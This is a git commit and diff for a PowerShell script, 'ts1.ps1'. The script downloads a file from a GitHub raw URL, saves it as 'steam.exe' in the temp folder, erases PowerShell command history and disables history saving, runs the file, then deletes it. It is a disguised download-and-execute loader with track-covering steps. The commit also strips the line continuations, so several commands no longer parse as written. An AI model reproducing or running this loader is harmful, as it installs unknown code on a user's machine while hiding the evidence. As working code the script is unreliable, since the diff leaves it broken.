d018b0f2997e44a789fde0c5482e7b40922ec2c2
yuri95166-a11y <yuri95166@gmail.com>
2026-06-02 02:04:34 +0700

    Update ts1.ps1

--- ts1.ps1
+++ ts1.ps1
@@ -1,5 +1,3 @@
-@@ -1,63 +1,63 @@
-$url = "https://raw.githubusercontent.com/yuri95166-a11y/ddd/main/ts1.ps1"
 $url = "https://raw.githubusercontent.com/yuri95166-a11y/ddd/main/ts1.ps1"
 
 $tempPath = Join-Path $env:TEMP "steam.exe"
@@ -7,30 +5,24 @@ $tempPath = Join-Path $env:TEMP "steam.exe"
 Write-Host "Downloading..." -ForegroundColor Cyan
 
 try {
-    Invoke-WebRequest `
-        -Uri $url `
-        -OutFile $tempPath `
+    Invoke-WebRequest 
+        -Uri $url 
+        -OutFile $tempPath 
         -ErrorAction Stop
 
     if (Test-Path $tempPath) {
 
         Write-Host "Download completed." -ForegroundColor Green
 
-        # Clear PowerShell history
         try {
-
-            # Clear current session history
             Clear-History -ErrorAction SilentlyContinue
 
-            # Get PSReadLine history file
             $historyPath = (Get-PSReadLineOption).HistorySavePath
 
-            # Remove saved history file
             if (Test-Path $historyPath) {
                 Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
             }
 
-            # Disable history saving for current session
             Set-PSReadLineOption -HistorySaveStyle SaveNothing
 
             Write-Host "History cleared." -ForegroundColor Yellow
@@ -41,17 +33,17 @@ try {
 
         Write-Host "Launching installer..." -ForegroundColor Green
 
-        Start-Process `
-            -FilePath $tempPath `
+        Start-Process 
+            -FilePath $tempPath 
             -Wait
 
         Write-Host "AFTER INSTALLER" -ForegroundColor Magenta
 
         Write-Host "Cleaning temporary files..." -ForegroundColor Yellow
 
-        Remove-Item `
-            -Path $tempPath `
-            -Force `
+        Remove-Item 
+            -Path $tempPath 
+            -Force 
             -ErrorAction SilentlyContinue
 
         Write-Host "Completed." -ForegroundColor Green
